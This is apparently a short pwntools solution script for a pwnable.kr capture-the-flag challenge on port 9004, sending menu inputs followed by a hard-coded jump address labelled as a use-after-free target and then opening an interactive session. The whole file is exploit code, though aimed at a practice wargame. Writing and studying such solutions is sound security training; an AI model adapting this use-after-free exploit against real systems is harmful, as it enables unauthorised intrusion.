from pwn import *

s = remote('pwnable.kr', 9004)
number = '1\n1\n1\n1\n3\n3\n2\n3\n3\n2\n3\n3\n2\n3\n3\n2\n'
uaf_jmp = '\xbf\x8d\x04\x08\n'
payload = number+uaf_jmp
s.send(payload)
s.interactive()
